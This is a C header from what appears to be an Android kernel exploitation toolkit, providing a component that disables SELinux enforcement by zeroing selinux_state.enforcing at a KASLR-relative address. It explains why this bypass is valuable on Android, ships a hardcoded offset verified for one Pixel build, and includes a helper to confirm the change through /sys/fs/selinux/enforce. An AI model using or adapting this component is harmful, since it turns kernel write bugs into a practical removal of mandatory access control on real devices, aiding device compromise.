/* lib/root/selinux_state.h -- disabling SELinux enforcement through a
 * one-shot content-controlled write to a global, KASLR-relative address.
 *
 * selinux_state.enforcing is a bool at struct offset 0 (BTF-verified). The
 * struct itself is a plain global (security/selinux/hooks.c), not a
 * per-process object, so reaching it needs no leak beyond the kernel's own
 * text base -- no per-process pointer chasing, no arbitrary-read primitive,
 * no forged object graph. Any bug that can write a few attacker-chosen bytes
 * to an address the caller picks can hit this directly: resolve the text
 * base (cves/lib/kaslr/kaslr_tracefs.h, root-free), add
 * LIB_SELINUX_ENFORCING_OFF, write one zero byte.
 *
 * This does not by itself grant root: it removes MAC, not DAC or
 * capabilities, and a process's own uid/gid/capabilities are untouched. What
 * it unlocks is device- and build-specific (Android leans on SELinux for
 * property_service, ctl.* service control, and binder-service reachability
 * far more than DAC, so it is often the more valuable of the two, but this
 * is not universal).
 *
 * LIB_SELINUX_ENFORCING_OFF is a link-time offset from the kernel image base
 * (_text), and it is per kernel BUILD, not universal -- a value correct for
 * one target is wrong for another. The default below is panther's
 * (CP2A.260705.006), verified two ways: it appears in
 * data/live/panther-CP2A.260705.006/offsets.report as SELINUX_ENFORCING_OFF,
 * "match" (cross-checked against that boot's own kallsyms during the
 * harvest), and independently, kernel_text_base + this offset equals that
 * boot's own kallsyms.txt address for selinux_state exactly. A consumer
 * building for a different target overrides the macro (or takes it from
 * that target's own offsets.report/target.h) before including this header.
 */
#ifndef LIB_ROOT_SELINUX_STATE_H
#define LIB_ROOT_SELINUX_STATE_H

#include <fcntl.h>
#include <unistd.h>

#ifndef LIB_SELINUX_ENFORCING_OFF
#define LIB_SELINUX_ENFORCING_OFF 0x225a420ULL
#endif

/* selinux_state.enforcing's address, given the kernel's own text base
 * (cves/lib/kaslr/kaslr_tracefs.h's lib_kaslr_leak_text(), or any other
 * source of it). */
static inline unsigned long long lib_selinux_state_addr(unsigned long long text_base)
{
	return text_base + LIB_SELINUX_ENFORCING_OFF;
}

/* Root-free confirmation that needs no kernel read at all: '1' enforcing,
 * '0' permissive, '?' if the file could not be read (SELinux itself denying
 * it, most likely -- the write this header exists for is what would change
 * that). This is the point of targeting a value the caller can observe
 * directly, rather than one that needs a privileged readback to confirm. */
static inline char lib_selinux_enforce_file(void)
{
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
	char c = '?';

	if (fd < 0)
		return '?';
	if (read(fd, &c, 1) != 1)
		c = '?';
	close(fd);
	return c;
}

#endif /* LIB_ROOT_SELINUX_STATE_H */
